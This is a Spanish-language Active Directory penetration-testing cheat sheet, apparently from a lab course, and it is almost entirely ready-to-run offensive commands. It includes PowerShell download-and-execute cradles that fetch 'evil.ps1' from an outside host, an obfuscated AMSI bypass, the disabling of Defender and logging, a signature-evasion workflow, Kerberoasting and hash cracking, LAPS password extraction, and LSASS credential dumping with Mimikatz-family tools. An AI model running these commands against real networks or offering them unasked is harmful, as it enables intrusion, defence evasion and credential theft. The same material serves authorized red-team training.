# Miscelánea

### Usuarios y grupos

```
### Consultar los usuarios y grupos locales
net user
net localgroup

### Consultar los usuarios de dominio
net user /domain
net group /domain
```

```
### Agregar un usuario a un grupo de dominio
net group "machineadmins" studentuser76 /add /domain

### Verificar usuarios pertenecientes al grupo de dominio 
net group "machineadmins" /domain
net group "<group_name>" /domain
```
### Recursos compartidos

```
### Listar Recursos compartidos
net share

### Listar recursos compartido de un equipo
net view \\US-HelpDesk /ALL

### Crear Recurso Compartido para enviar binarios
C:\AD\Tools>net use x: \\us-mailmgmt\C$\Users\Public /user:us-mailmgmt\Administrator ;+NOFY!&+O36sb
C:\AD\Tools>echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
C:\AD\Tools>net use x: /d

### Transferir archivo Loader.exe mediante bitsadmin
bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader2.exe
```
### Netsh para Port Forward

El siguiente comando redirige todas las conexiones entrantes en el puerto 8080 a la dirección IP 192.168.100.76 en el puerto 80. 

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.76
```

Esto puede ser útil en caso existan restricciones para la transferencia de archivo. El comando anterior se puede usar en conjunto con el siguiente, ejecutando así el archivo ubicado en el puerto 80 del host 192.168.100.76:

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```
#### Verificando Port Forward

```cmd
netsh interface portproxy show v4tov4
```
### AD

```
### Consultar el dominio actual
$env:UserDNSDomain
```
# AppLocker, WDAC, Windows Defender, ConstrainedLanguage

```
### Verificar modo de lenguaje
$ExecutionContext.SessionState.LanguageMode
```

- Las políticas de Applocker se almacenan en el registro. Se pueden realizar consultas al registro, si se obtiene un error significa que Applocker no está en uso. Tenga en cuenta que el siguiente comando asume que reg.exe tiene permiso para ejecutarse en el entorno.

```
### Enumerar AppLocker con reg.exe
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
# Enumerar AppLocker con Get-AppLockerPolicy
Get-AppLockerPolicy -Effective
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

- También se puede usar el comando ``wmic`` para comprobar WDAC

```
# Enumerar WDAC
Get-CimInstance -ClassName Win32_DeviceGuard  -Namespace root\Microsoft\Windows\DeviceGuard
```

```
# Windows Defender
### Enumerar Windows Defender 
Get-MpComputerStatus
### Compruebe tamper protection
Get-MpComputerStatus|select IsTamperProtected
### Deshabilitar Monitoreo en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true
```
# PowerShell

```
# PowerShell Scripts y Modules

### Cargar script PowerShell en la sesión actual
. C:\AD\Tools\PowerView.ps1

### Importar un modulo o script
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

### Listar los comandos de un modulo
Get-Command -Module <modulename>
```
### PowerShell Script Execution

Algunas formas de descargar el script y ejecutarlos en memoria:

```
# PowerShell Script Execution
# Todos estos comandos ejecutan el archivo en memoria

### Este es comunmente detectado por los EDR
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

### iwr PSv3 onwards 
iex (iwr 'http://192.168.230.1/evil.ps1')

### ComObject junto a InternetExplorer es menos detectado 
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

### ComObject
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText

### WebRequest
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
### Execution Policy

La política de ejecución no es un sistema de seguridad que restrinja las acciones de los usuarios. Por ejemplo, los usuarios pueden saltarse fácilmente una política escribiendo el contenido del script en la línea de comandos cuando no pueden ejecutar un script. 

La política de ejecución ayuda a los usuarios a establecer reglas básicas y evita que las violen involuntariamente.

```
# Bypass Execution Policy
### Ejecutar scripts
powershell –ExecutionPolicy bypass

### Ejecutar comandos sin necesidad de un script
powershell –c <cmd>

### Ejecutar un comando codificado en Base64
powershell –encodedcommand

### Cambiar temporalmente la Política de Ejecución a "Bypass"
$env:PSExecutionPolicyPreference="bypass"
```
# Bypassing PowerShell Security/AV

Aqui hay ``bypasses`` y también ``obfuscated bypasses``
## Invi-Shell

InviShell elude todas las funciones de seguridad de Powershell (ScriptBlock logging, Module logging, Transcription, AMSI)

``RunWithRegistryNonAdmin.bat`` modifica el registro HKCU que es solo para el usuario actual a diferencia de ``RunWithPathAsAdmin.bat`` que modifica la entrada del registro HKLM que está a nivel de máquina. La modificación de registros a nivel de máquina tiene muchas más reglas de detección que a nivel de usuario.

``RunWithRegistryNonAdmin.bat`` añade registros y una ruta a InShellProf.dll para que cada vez que se carga powershell también se cargue el ``dll``.

- Tener en cuenta que los binarios se comportan mal con InviShell. Por ejemplo, tendrás problemas si ejecutas Rubeus.exe luego de haber ejecutado InviShell en la misma consola.
- Invishell se utiliza para desactivar evitar el registro. Si lo utiliza entonces no hay transcripción Powershell.

```
### Sin privilegios admins (recomendado)
### Las modificaciones se aplican al usuario actual
RunWithRegistryNonAdmin.bat

### Con privilegios admin (no tan recomendado)
### Las modificaciones se aplican en todo el sistema
RunWithPathAsAdmin.bat

### Escribir "exit" para eliminar las entradas de registro modificadas
```

¿Cómo llevar estos archivos al equipo? Una opción es escribir los ``.bat`` o ``.dll``
## Bypassing AV Signatures for PowerShell

### Cargar scripts en memoria y evitar la detección usando AMSI bypass

```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
### AMSITrigger

Herramienta para identificar la parte exacta de un script que es detectado por AMSI.

```
### AMSITrigger
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
```

Los pasos para evitar la detección basada en firmas:
1) Escanear usando AMSITrigger
2) Modifique el fragmento de código detectado (Invertir cadenas, cambiar nombre de variables)
3) Vuelva a escanear con AMSITrigger
4) Repita los pasos 2 y 3 hasta que obtenga un resultado como ``AMSI_RESULT_NOT_DETECTED`` o en blanco
### DefenderCheck

Herramienta para identificar codigo y strings desde un binario/archivo que puede ser detectado por Windows Defender.

```
### DefenderCheck
DefenderCheck.exe PowerUp.ps1
```
## NetLoader

Podemos utilizar NetLoader  para entregar nuestras cargas binarias.

¿Por qué necesitamos NetLoader (Loader.exe)? ¿Cuál es la diferencia entre ejecutar normalmente y ejecutar con loader.exe? 

- Puede ser usado para cargar binarios desde una ruta de archivo o URL y parchear AMSI & ETW mientras se ejecuta para que no sea detectado por AV.

```
C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```

 También está AssemblyLoad.exe que se puede utilizar para cargar el NetLoader en memoria desde una URL para que luego cargue un binario desde una ruta de archivo o URL.

```
C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```
### Más sobre AMSI Bypass:

- [**Amsi Overview and Bypass Methods**](https://medium.com/@nullx3d/amsi-overview-and-bypass-methods-76b9d5896eb5)
- [**AMSI Bypass Methods**](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
- [**Hunting for malicious strings using AmsiTrigger**](https://www.rythmstick.net/posts/amsitrigger/)
- [**Invoke-Obfuscation - Hiding Payloads To Avoid Detection**](https://medium.com/@ammadb/invoke-obfuscation-hiding-payloads-to-avoid-detection-87de291d61d3)
# Domain Enumeration

Se pueden usar herramientas como PowerView, BloodHound, ActiveDirectory Module para la enumeración.

- ActiveDirectory PowerShell module puede ejecutarse incluso en entornos con la Política de Lenguaje Constrained (CLM) de PowerShell.

```
### ActiveDirectory PowerShell module
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

### PowerView
C:\AD\Tools\PowerView.ps1

### BloodHound
### Ejecutar Ingestors\Collectors
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1 
Invoke-BloodHound -CollectionMethod All
SharpHound.exe
### Para evitar alertas sobre la enumeración de sesiones en los DCs
Invoke-BloodHound -CollectionMethod All -ExcludeDomainControllers
```
## Dominio

```
### Obtener Información del dominio actual
Get-Domain (PowerView)
Get-ADDomain (ActiveDirectory Module)

### Obtener Información de un dominio
Get-Domain –Domain techcorp.local
Get-ADDomain -Identity techcorp.local

### Obtener SID de un dominio
Get-DomainSID
(Get-ADDomain).DomainSID
```

```
### Obtener política del dominio actual
### Incluye Politica de Kerberos, politica de contraseñas, etc
Get-DomainPolicyData
(Get-DomainPolicyData).systemaccess

### Obtener política de un dominio
(Get-DomainPolicyData –domain techcorp.local).systemaccess
```
## Usuario

```
### Listar usuarios en el actual dominio
Get-DomainUser
Get-DomainUser –Identity studentuser1
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity studentuser1 -Properties *

### Listar propiedades de los usuarios en el actual dominio
Get-DomainUser -Identity studentuser1 -Properties *
Get-DomainUser -Properties pwdlastset
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}

### Listar una propiedad específica de todos los usuarios(samaccountname)
Get-ADUser -Filter * | Select -ExpandProperty samaccountname
```

```
### Buscar un string en los atributos de un usuario(Por ejemplo admin,pass)
Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```
## Equipos

```
### Obtener un listado de los equipos en el dominio actual 
Get-DomainComputer | select Name
Get-ADComputer -Filter * -Server <dominio>
Get-ADComputer –Filter * | select –expand name

### Obtener un listado de los equipos por OS
Get-DomainComputer –OperatingSystem "Windows Server 2019 Standard"
Get-ADComputer -Filter 'OperatingSystem -like "*Windows Server 2019 Standard*"' -Properties OperatingSystem | select Name,OperatingSystem

### Identifica los equipos del dominio en funcionamiento
### No habrá conexión ping si solo es una cuenta de equipo creada 
Get-DomainComputer -Ping
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```
## Grupos de dominio

```
### Obtener los groups en el dominio actual
Get-DomainGroup | select Name
Get-DomainGroup –Domain techcorp.local
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *
Get-ADGroup -Identity 'Domain Admins' -Properties *

### Obtener los groups que contienen la palabra "admin" en su nombre
Get-DomainGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```

```
### Obtener todos los miembros de un grupo
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-ADGroupMember -Identity 'Enterprise Admins' -Server techcorp.local

### Obtener los grupos de un usuario
Get-DomainGroup –UserName studentuser1
Get-ADPrincipalGroupMembership -Identity studentuser1
```

- ``Get-ADPrinicpalGroupMemebsrhip`` del módulo ActiveDirectory no proporciona la capacidad de buscar recursivamente la pertenencia a un grupo. Por lo tanto, podemos utilizar el siguiente código:

```
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
{
$groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)
$groups
if ($groups.count -gt 0)
{
foreach ($group in $groups)
{
Get-ADPrincipalGroupMembershipRecursive $group
}
}
}

Get-ADPrincipalGroupMembershipRecursive 'studentuser76'
````
## Grupos Locales

```
### Obtener los grupos locales en una maquina
### Necesita privilegios de administrador para realizar consulta
Get-NetLocalGroup -ComputerName us-dc

### Obtener los miembros de los grupos locales en una maquina
### Necesita privilegios de administrador para realizar consulta
Get-NetLocalGroupMember -ComputerName us-dc

### Obtener los miembros del grupo "Administrators" en una maquina
### Necesita privilegios de administrador para realizar consulta
Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators
```
## GPO

- Las GPOs ayudan a gestionar configuraciones y cambios

```
### Obtener listado de GPOs del dominio actual
Get-DomainGPO
Get-DomainGPO | select displayname,name,gpcfilesyspath

### Devuelve todos los objetos GPO aplicados a una identidad de equipo determinada
Get-DomainGPO -ComputerIdentity student1.us.techcorp.local

### Obtener GPO que usan Grupos Restringidos
Get-DomainGPOLocalGroup
```

```
### Obtener los usuarios que están en un grupo local de una máquina usando GPO
Get-DomainGPOComputerLocalGroupMapping –ComputerIdentity student1.us.techcorp.local
Get-DomainGPOComputerLocalGroupMapping –ComputerIdentity us-mgmt.us.techcorp.local

### Obtener máquinas donde el usuario dado es miembro de un grupo específico
Get-DomainGPOUserLocalGroupMapping -Identity studentuser1 -Verbose
```
## OUs

```
### Obtener OUs en un dominio
Get-DomainOU
Get-DomainOU | select displayname,name,distinguishedname,ou
Get-DomainOU | select displayname,name,gplink
(Get-DomainOU -Identity Students).gplink
Get-ADOrganizationalUnit -Filter * -Properties *

### Obtener GPO aplicado en una OU
### Se muestra la GPO en DisplayName
### Lee GPOname del atributo gplink de Get-DomainOU
Get-DomainGPO -Identity '{7162874B-E6F0-45AD-A3BF-0858DA4FA02F}'
```

```
### Obtener los usuarios que están en un grupo local de una máquina en cualquier OU usando GPO
(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping

### Enumerar las computadoras en Students OU
(Get-DomainOU -Identity Students).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select cn

### Enumerar computadoras en StudentMachines OU
Get-ADOrganizationalUnit -Identity 'OU=StudentsMachines,DC=us,DC=techcorp,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | select name

### Obtener los usuarios que están en un grupo local de una máquina en una OU particular usando GPO
(Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping

Get-DomainGPOComputerLocalGroupMapping -OUIdentity 'OU=Mgmt,DC=us,DC=techcorp,DC=local'
```
## ACLs

- ``SecurityIdentifier`` es el SID del objeto que tiene permisos sobre ``ObjectDN`` (ejm: studentuser76)
- ``ResolveGUIDs`` permite identificar ACE de forma legible

```
### Obtener las ACL asociadas a un objeto especificado
### Permisos que tienen otros sobre studentuser76
Get-DomainObjectAcl -Identity studentuser76 –ResolveGUIDs

### Obtener las ACL asociadas a la ruta LDAP especificada que se utilizarán para la búsqueda
Get-DomainObjectAcl -Searchbase "LDAP://CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local" -ResolveGUIDs -Verbose

### También podemos enumerar ACLs utilizando el módulo ActiveDirectory pero sin resolver GUIDs
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=us,DC=techcorp,DC=local').Access
```

- Ejemplo: Obtener los derechos que tiene el usuario Pedro sobre Rita

```
PS C:\Tools> $userSID = (Get-DomainUser -Identity pedro).objectsid
PS C:\Tools> Get-DomainObjectAcl -Identity rita | ?{$_.SecurityIdentifier -eq $userSID}
```

- ``Find-InterestingDomainAcl`` encuentra ACLs de objetos con derechos de modificación establecidos para objetos(cuentas, usuarios) que no son por defecto

```
### Buscar ACEs interesantes (utilizar sin GUIDs para un resultado más rápido)
Find-InterestingDomainAcl -ResolveGUIDs
```

- Ejemplo: Obtener ACLs no por defecto que tiene el usuario con ``SID "S-1-5-21-210670787-2521448726-163245708-16106"`` sobre otros objetos

```
PS C:\AD\Tools> $userSID = "S-1-5-21-210670787-2521448726-163245708-16106"
PS C:\AD\Tools> $userSID
S-1-5-21-210670787-2521448726-163245708-16106
PS C:\AD\Tools> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```

- Ejemplo: Obtener ACLs no por defecto que tiene el usuario ``studentuser76`` y uno de los grupos al que pertenece, sobre otros objetos

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentuser76"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'}
```

Importante: Consultar las ACLs del usuario y de sus membresias de grupo.
### Recurso compartido

```
### Obtener las ACL asociadas a la ruta especificada
Get-PathAcl -Path "\\us-dc\sysvol"
```
## Trusts (Confianzas)

```
### Obtener una lista de todas las confianzas para el dominio actual
Get-DomainTrust
Get-DomainTrust –Domain techcorp.local
Get-ADTrust
Get-ADTrust –Identity techcorp.local
```
## Forest

```
### Obtener detalles sobre el bosque actual
Get-Forest
Get-ADForest

### Obtener todos los dominios del bosque actual
Get-ForestDomain
(Get-ADForest).Domains
```

```
### Obtener todos los catálogos globales del bosque actual
Get-ForestGlobalCatalog
Get-ADForest | select -ExpandProperty GlobalCatalogs

### Mapear las confianzas del dominio actual(us.techcorp.local)
Get-ADTrust -Filter *

### Mapear las confianzas del bosque(techcorp.local)
Get-ForestTrust
Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
```

Nota: En una confianza bidireccional o confianza unidireccional entrante de eu.local a us.techcorp.local, podemos extraer información del bosque eu.local.
# User Hunting

- ``Find-LocalAdminAccess`` puede ser algo ruidoso, además de generar eventos (4624 y 4634)
- Ejecutar ``Find-LocalAdminAccess`` antes y después de realizar modificaciones ACLs, Privilege Escalation, etc.

 ```
### Buscar acceso de administrador local con el usuario actual sobre el dominio (PowerView)
### Get-DomainComputer + Test-AdminAccess 
Find-LocalAdminAccess –Verbose

### En caso los puertos RPC y SMB utilizados por Find-LocalAdminAccess estén bloqueados, usar:
Find-WMILocalAdminAccess.ps1 
Find-PSRemotingLocalAdminAccess.ps1
```

- ``Find-DomainUserLocation`` busca sesiones en equipos

```
### Buscar computadoras donde un domain admin (o user/group) tiene sesiones:
### Get-DomainComputer + Get-NetSession/Get-NetLoggedon
### No funciona en WindowsServer2019 o Windows10 después de un parche, a menos que sea administrador local
Find-DomainUserLocation -Verbose
Find-DomainUserLocation -UserGroupIdentity "StudentUsers"
```

```
### Buscar computadoras donde un domain admin (o user/group) tiene sesiones y el usuario actual tenga acceso de administrador(Test-AdminAccess)
Find-DomainUserLocation -CheckAccess

### Buscar computadoras (File Servers and Distributed File servers) donde un domain admin (o user/group) tiene sesiones
Find-DomainUserLocation –Stealth
```
# Privilege Escalation

## Miscelanea

```
### PowerUp
Invoke-AllChecks

### Privesc:
Invoke-PrivEsc

### PEASS-ng:
winPEASx64.exe
```

```
# Privilege Escalation

### Obtener servicios con rutas sin comillas y un espacio en su nombre
Get-ServiceUnquoted -Verbose

### Obtener servicios donde el usuario actual puede escribir en su ruta binaria o cambiar argumentos en el binario
Get-ModifiableServiceFile -Verbose

### Obtener los servicios cuya configuración el usuario actual puede modificar
Get-ModifiableService -Verbose
```

- ``Get-WmiObject | ft SystemName,Name,StartName`` para ver los servicios que se ejecutan y sus privilegios de inicio.
# PowerShell Remoting

- PSRemoting se compara con "psexec mejorado" porque proporciona una forma más robusta y rica en funciones para ejecutar comandos en máquinas remotas
- PSRemoting utiliza Windows Remote Management (WinRM)
- Puertos predeterminados (5985 para HTTP, 5986 para HTTPS)
- ``Enable-PSRemoting`` permite habilitar PSRemoting (Se requieren privilegios administrativos)
- Apenas inicies sesion usando la conexion PSRemoting en una maquina remota, los comandos que ejecutas se registraran en la transcripcion (script block logging)

```
# PowerShell Remoting
### Enter-PSSession
Enter-PSSession -ComputerName us-mgmt

### New-PSSession
$Sess = New-PSSession –Computername Server1 
$Sess
Enter-PSSession -Session $Sess

### New-PSSession con credenciales
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("<server>\<user>", $passwd)
$mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
$mailmgmt
Enter-PSSession -Session $mailmgmt
```

- Se puede usar ``winrs`` en lugar de PSRemoting para evadir el registro (y aún así obtener el beneficio de permitir el tráfico en el puerto 5985 entre los hosts)

```
# Winrs
winrs -r:us-mgmt cmd
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```
## Invoke Command

```
### Ejecutar comandos en multiples hosts o bloques de script
Invoke-Command –Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)

### Ejecutar un script en multiples hosts 
Invoke-Command –FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

```
### Ejecutar la función cargada localmente en las máquinas remotas
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)

### Si se requieren pasar argumentos
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

```
### Ejecutar comando con una sessión definida 
### Invoke-Command + Session
$Sess = New-PSSession –Computername Server1
Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get-Process}
Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name}
```
# Domain Privilege Escalation

- Kerberos es la base de autenticacion en los sistemas de Windows Active Directory
## Kerberoast

### Enumeración

```
# Enumeración de cuentas con SPN configurado
### ActiveDirectory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

### PowerView
Get-DomainUser –SPN
```
### Explotación

- Para evitar detecciones basadas en Encryption Downgrade for Kerberos EType (utilizado por MDI - ``0x17 significa rc4-hmac``), busque cuentas Kerberoastable que sólo soporten RC4_HMAC.
- ``/rc4opsec`` utiliza el truco ``tgtdeleg`` y se obtienen las cuentas sin AES activado
- ``/rc4opsec`` obtiene hashes sólo para las cuentas que soportan RC4. Esto significa que si ' ``This account supports Kerberos AES 128/256 bit encryption``' está configurado para una cuenta de servicio, el siguiente comando no solicitará sus hashes.
- ``/simple`` mostrará en la consola los hashes uno por línea
- ``/stats`` mostrará estadísticas sobre los usuarios kerberoastable encontrados

```
### Listar estadísticas sobre las cuentas Kerberoastable sin necesidad de enviar solicitudes de tickets
Rubeus.exe kerberoast /stats

### Solicitar Ticket de Servicio (ST)
Rubeus.exe kerberoast /user:serviceaccount /simple

### Listar estadísticas sobre las cuentas Kerberoastable sin AES activado
Rubeus.exe kerberoast /stats /rc4opsec

### Kerberoast sobre la cuenta serviceaccount sin AES activado
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec

### Kerberoast todas las cuentas sin AES activado
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

Tambien se puede usar la clase KerberosRequestorSecurityToken.NET, Mimikatz y tgsrepcrack.py 

```
### KerberosRequestorSecurityToken .NET de PowerShell para solicitar un ticket.
### Solicitar un ticket para el usuario serviceaccount
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"

### Comprobar si tenemos el ticket
klist

### Volcar los tickets en el disco
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"kerberos::list /export"'

### Ahora solo queda crackear el ticket exportado (.kirbi)
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-60210000-studentuserx@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi

```
### Cracking

```
Crack ticket usando John the Ripper
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```
## Targeted Kerberoasting 

- Si tenemos permisos suficientes (``GenericAll/GenericWrite``) sobre un usuario, el SPN de dicho usuario objetivo puede ser configurado con cualquier cosa (único en el dominio)
- Se pueden solicitar ST sin privilegios especiales.
- Esto es posible cuando la cuenta controlada tiene **GenericAll, GenericWrite, WriteProperty, o Validated-SPN** sobre el objetivo.
### Enumeración

```
### Permisos interesantes del grupo StudentUsers sobre otros
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}

### Permisos del grupo StudentUsers sobre otros
$userSID = (Get-DomainGroup -Identity StudentUsers).objectsid
Get-DomainObjectAcl | ?{$_.SecurityIdentifier -eq $userSID}
```

```
### Ver si el usuario tiene un SPN configurado (Powerview)
Get-DomainUser -Identity support1user | select serviceprincipalname

### Ver si el usuario tiene un SPN configurado (modulo ActiveDirectory)
Get-ADUser -Identity support1user -Properties ServicePrincipalName | select ServicePrincipalName
```
### Explotación

```
• Configurar SPN (Powerview)
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspnX'}

• Configurar SPN (ActiveDirectory module)
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='us/myspnX'}
```

- Los pasos que continúan siguen un proceso similar a ``Kerberoast``
## LAPS

- LAPS es una solución creada por Mircrosoft para administrar contraseñas administrativas.
- LAPS mitiga el riesgo de escalada lateral que se produce cuando los clientes tienen la misma combinación de cuenta local administrativa y contraseña en muchos ordenadores.
- Se puede configurar mediante GPO
- LAPS implementa un control de acceso que regula quién puede leer las contraseñas en texto claro. Solo los Administradores de Dominio y usuarios explícitamente autorizados pueden acceder y leer estas contraseñas.
- Si se logra acceder a la contraseña, se puede acceder al equipo con derechos de administrador local.

Para configurar LAPS se modifica el esquema para la cuenta de máquina y se agregan a dos atributos adicionales:
- Admin Password (``ms-MCS-AdmPwd``): contiene la contraseña del administrador local 
- pwd Expiration Time (``ms-MCS-AdmPwdExpirationTime``): vencimiento de la contraseña
Esta configuración se implementa en un archivo dll llamado ``admpwd.dll`` .
### Enumeración

En un ordenador, si se está utilizando LAPS, se puede encontrar una biblioteca AdmPwd.dll en el directorio ``C:\Program Files\LAPS\CSE\``.

```
### Para encontrar a los usuarios que pueden leer las contraseñas en texto claro máquinas en OUs
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')}
```

- Buscar cuentas o grupos con derechos de acceso ``GenericAll, AllExtendedRights`` contra un equipo de destino configurado con LAPS o ``ReadProperty`` sobre el atributo ``ms-MCS-AdmPwd``.

```
$group = Get-DomainGroup -Identity "LAPS Readers"
Get-DomainObjectAcl -Identity LAPS09 -ResolveGUIDs  |?{$_.SecurityIdentifier -eq $group.objectsid}
```

```
Para enumerar OUs donde LAPS está en uso junto con los usuarios que pueden leer las contraseñas en texto claro
### Active Directory module
Get-LapsPermissions.ps1

### LAPS module 
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```
### Explotación

```
### PowerView
Get-DomainObject -Identity <targetmachine$> | select -ExpandProperty ms-mcs-admpwd

### Active Directory module
Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd

### LAPS module
Get-AdmPwdPassword -ComputerName <targetmachine>
```

Luego de la explotación, se puede usar  ``winrs`` o ``PSRemoting`` para conectarnos como Administrador Local del host comprometido:

```
### Winrs
winrs -r:us-mailmgmt -u:.\administrator -p:t7HoBF+m]ctv.] cmd

### PSRemoting
$passwd = ConvertTo-SecureString 't7HoBF+m]ctv.]' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
$mailmgmt
```
# Lateral Movement

- Mimikatz puede ser usado para dumpear credenciales, tickets y mas interesantes ataques.
- Se necesitará privilegios administrativos para volcar las credenciales
## Mimikatz - Extracción de Credenciales desde LSASS

Se aprovechará una gran cantidad de claves AES en lugar de Hash NTLM. Las claves AES ayudarán a evitar ciertas detecciones de herramientas como MD

```
### Volcar credenciales en una máquina local usando Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

### Uso de SafetyKatz (Minidump de lsass y PELoader para ejecutar Mimikatz)
SafetyKatz.exe "sekurlsa::ekeys"

### Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
SharpKatz.exe --Command ekeys

### Volcado de credenciales mediante Dumpert (llamadas directas al sistema y API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

### Uso de pypykatz (funcionalidad de Mimikatz en Python)
pypykatz.exe live lsa

### Volcado de credenciales mediante un archivo .dmp y mimikatz
SafetyKatz.exe
mimikatz # sekurlsa::minidump C:\AD\Tools\lsass2.dmp
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

```
### Uso de Lsass-Shtinkering
Lsass_Shtinkering.exe
- Utiliza Windows Error Reporting Service para volcar la memoria del proceso LSASS.
- Informa manualmente de una excepción al WER en LSASS que generará el volcado sin bloquear el proceso.
- Funciona en Windows 10, Server 2022.
- Durante nuestras pruebas encontramos que no funciona en Server 2019.
```
### LOLBAS

```
# Uso de comsvcs.dll
### Enumerar ID Process
